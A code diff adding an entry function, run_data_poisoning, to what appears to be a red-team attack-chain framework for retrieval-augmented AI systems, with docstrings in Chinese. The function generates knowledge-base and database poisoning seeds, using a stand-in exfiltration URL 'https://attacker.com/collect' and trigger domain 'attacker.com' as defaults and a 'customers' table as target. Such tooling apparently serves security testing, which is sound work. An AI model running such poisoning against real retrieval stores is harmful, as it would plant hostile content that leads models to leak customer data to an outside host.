@@ -411,3 +411,32 @@ def create_data_poisoning_injector(
         exfil_url=exfil_url,
         trigger_domain=trigger_domain,
     )
+
+
+async def run_data_poisoning(ctx: Any) -> dict[str, Any]:
+    """攻击链入口（ChainExecutor 发现名：`run_<action>` = `run_data_poisoning`）。
+
+    作为 `config/components/rag.yaml` 声明于 `strike_modules` 的链步骤入口，被
+    `strike/common/chain_executor.py` 通过 `run_<action>` 精确匹配并调用。
+
+    本组件为**数据/知识库投毒 payload 生成器**（无活体数据源可投毒，属黑盒外产物），
+    故产出结构化种子供下游注入/检索阶段消费，不做任何网络写入。
+
+    Args:
+        ctx: PipelineContext（可选读取 args.exfil_url / trigger_domain /
+            poison_table / poison_kb_entry）
+
+    Returns:
+        {"seeds": [seed-format dict, ...], "count": int}
+    """
+    args = getattr(ctx, "args", None)
+    exfil_url = getattr(args, "exfil_url", "https://attacker.com/collect")
+    trigger_domain = getattr(args, "trigger_domain", "attacker.com")
+    target_table = getattr(args, "poison_table", "customers")
+    kb_entry = getattr(args, "poison_kb_entry", "sales_process")
+
+    injector = DataPoisoningInjector(exfil_url=exfil_url, trigger_domain=trigger_domain)
+    seeds = injector.generate_all_poison_types(target_table=target_table, kb_entry=kb_entry)
+
+    logger.info("[Chain] data_poisoning 生成 %d 条投毒种子", len(seeds))
+    return {"seeds": seeds, "count": len(seeds)}
